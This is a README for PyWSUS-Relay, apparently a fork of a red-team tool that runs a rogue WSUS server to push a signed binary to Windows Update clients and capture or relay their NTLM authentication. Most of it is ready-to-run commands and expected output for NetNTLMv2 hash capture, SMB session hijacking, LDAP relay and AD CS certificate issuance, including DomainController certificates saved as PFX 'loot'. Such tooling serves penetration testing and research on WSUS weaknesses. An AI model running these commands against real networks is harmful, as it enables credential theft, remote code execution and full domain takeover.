# PyWSUS-Relay

Rogue WSUS-over-HTTP server that keeps Windows Update Agent (WUA) talking while serving controlled WSUS metadata and a Microsoft-signed payload.

This fork adds NTLM capture plus HTTP, AD CS, SMB, and LDAP/LDAPS relay handling.

## Capabilities

- WSUS SOAP emulation, client fingerprinting, update metadata, payload delivery, and session rotation.
- NTLM Type 1/Type 3 capture with NetNTLMv1/v2 hash and JSONL output.
- HTTP/HTTPS authentication relay and AD CS `/certsrv/` validation or certificate issuance.
- SMB authentication proof, share listing, and in-memory kept sessions.
- LDAP/LDAPS authentication proof, RootDSE, Who Am I, and base-object validation.
- WinRM is not implemented yet.

## Install

```bash
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt
```

Use a Microsoft-signed PE payload, for example `PsExec64.exe`.

## Run

Normal WSUS mode:

```bash
python3 pywsus.py -H 0.0.0.0 -p 8530 -e PsExec64.exe -c '/accepteula' -v
```

NTLM capture:

```bash
python3 pywsus.py -H 0.0.0.0 -p 8530 -e PsExec64.exe -c '/accepteula' \
  --ntlm-mode capture \
  --hash-file netntlm-captures.txt \
  --json-events wsus-events.jsonl \
  -v
```

HTTP relay:

```bash
python3 pywsus.py -H 0.0.0.0 -p 8530 -e PsExec64.exe -c '/accepteula' \
  --ntlm-mode relay-http \
  --relay-target http://target.lab.local/protected/ \
  --relay-action auth-only \
  -v
```

SMB relay:

```bash
python3 pywsus.py -H 0.0.0.0 -p 8530 -e PsExec64.exe -c '/accepteula' \
  --ntlm-mode relay-smb \
  --relay-target smb://192.168.56.102/ \
  --relay-action list-shares \
  --json-events relay-smb.jsonl \
  -v
```

Keep an SMB session:

```bash
python3 pywsus.py -H 0.0.0.0 -p 8530 -e PsExec64.exe -c '/accepteula' \
  --ntlm-mode relay-smb \
  --relay-target smb://192.168.56.102/ \
  --relay-action keep-session \
  --json-events relay-smb-session.jsonl \
  -v
```

LDAP relay with RootDSE validation:

```bash
python3 pywsus.py -H 0.0.0.0 -p 8530 -e PsExec64.exe -c '/accepteula' \
  --ntlm-mode relay-ldap \
  --relay-target ldap://192.168.56.102/ \
  --relay-action ldap-rootdse \
  --relay-preflight \
  --json-events relay-ldap.jsonl \
  -v
```

LDAP base-object validation over LDAPS:

```bash
python3 pywsus.py -H 0.0.0.0 -p 8530 -e PsExec64.exe -c '/accepteula' \
  --ntlm-mode relay-ldap \
  --relay-target ldaps://192.168.56.102/ \
  --relay-action ldap-base-search \
  --json-events relay-ldaps.jsonl \
  -v
```

AD CS Web Enrollment validation:

```bash
python3 pywsus.py -H 0.0.0.0 -p 8530 -e PsExec64.exe -c '/accepteula' \
  --ntlm-mode relay-http \
  --relay-target http://ca.lab.local/certsrv/ \
  --relay-action adcs-certsrv \
  --relay-adcs-marker PYWSUS-LAB-ADCS \
  --json-events relay-adcs.jsonl \
  -v
```

AD CS certificate issuance:

```bash
python3 pywsus.py -H 0.0.0.0 -p 8530 -e PsExec64.exe -c '/accepteula' \
  --ntlm-mode relay-http \
  --relay-target http://ca.lab.local/certsrv/ \
  --relay-action adcs-issue \
  --adcs-template Machine \
  --adcs-loot-dir loot \
  -v
```

Domain controller certificate issuance:

```bash
python3 pywsus.py -H 0.0.0.0 -p 8530 -e PsExec64.exe -c '/accepteula' \
  --ntlm-mode relay-http \
  --relay-target http://192.168.56.102/certsrv/ \
  --relay-action adcs-issue \
  --adcs-template DomainController \
  --adcs-loot-dir loot \
  --json-events issue-adcs-dc.jsonl \
  -v
```

Successful signal:

```text
HTTP relay result  identity=DOMAIN\DC02$ ... authenticated=True validation=type3-and-followup followup=accepted service=adcs-web-enrollment service_validated=True adcs_issued=True cert_id=7 pfx=loot/DOMAIN_DC02.pfx
```

## Useful Options

```text
--ntlm-mode {off,challenge-only,capture,relay-http,relay-smb,relay-ldap}
--relay-target URL
--relay-action {auth-only,adcs-certsrv,adcs-issue,list-shares,keep-session,ldap-rootdse,ldap-whoami,ldap-base-search}
--relay-preflight
--relay-adcs-marker TEXT
--adcs-template NAME
--adcs-alt-name UPN
--adcs-loot-dir DIR
--ntlm-session-key {ip,connection}
--ntlm-protect-downloads
--hash-file FILE
--json-events FILE
--log-file FILE
-r HOURS
```

Interactive keys:

```text
q  quit
r  rotate session
s  show kept SMB sessions
l  list shares from kept SMB sessions
x  close kept SMB sessions
```

## Expected Signals

Capture:

```text
NTLM Type 3 authenticate received ... identity=DOMAIN\HOST$
HashCapture NetNTLMv2 DOMAIN\HOST$ -> netntlm-captures.txt
GetConfig
```

AD CS relay validation:

```text
HTTP relay result ... authenticated=True validation=type3-and-followup followup=accepted service=adcs-web-enrollment service_validated=True
```

SMB relay:

```text
SMB relay result ... authenticated=True validation=smb-session-setup service=smb service_validated=True signing_required=False shares=5
SMB relay result ... authenticated=True validation=smb-session-setup service=smb session_id=1 action_state=session-kept
```

LDAP relay:

```text
LDAP relay result ... authenticated=True validation=ldap-bind service=ldap service_validated=True transport=ldap rootdse=True base_dn=DC=domain,DC=lab action_state=rootdse-read
```

AD CS issuance:

```text
HTTP relay result ... adcs_issued=True cert_id=42 pfx=loot/DOMAIN_HOST_.pfx
```

## Notes

- Default NTLM session key is `ip`; use this for single-client WUA testing.
- Use `--ntlm-session-key connection` for stricter IP+source-port tracking.
- NetNTLMv2 output format: `user::domain:challenge:nt_proof:client_blob`.
- Generated state includes `data/known_clients.json`, `netntlm-captures.txt`, optional JSONL event logs, and optional PFX loot.
- `relay-smb` uses Impacket's SMB relay client; SMB signing required on the target usually blocks relay.
- `keep-session` keeps an authenticated Impacket SMB session in memory for the current pyWSUS process.
- `relay-ldap` uses Impacket's LDAP/LDAPS relay client. Its LDAP actions are read-only: RootDSE, Who Am I, and a base-object search.
- `--relay-preflight` performs an unauthenticated RootDSE query before the WSUS listener accepts requests.
- `adcs-certsrv` probes `/certsrv/certrqxt.asp`; `adcs-issue` submits a CSR and saves a PFX.
- JSON relay results include target cookies and AD CS debug HTML paths when issuance fails.

## Credits

Original PyWSUS research/tooling by GoSecure, with prior proxy PoC research by Paul Stone and Alex Chapman. See the GoSecure WSUS attack blog series and MS-WUSP documentation for protocol background.
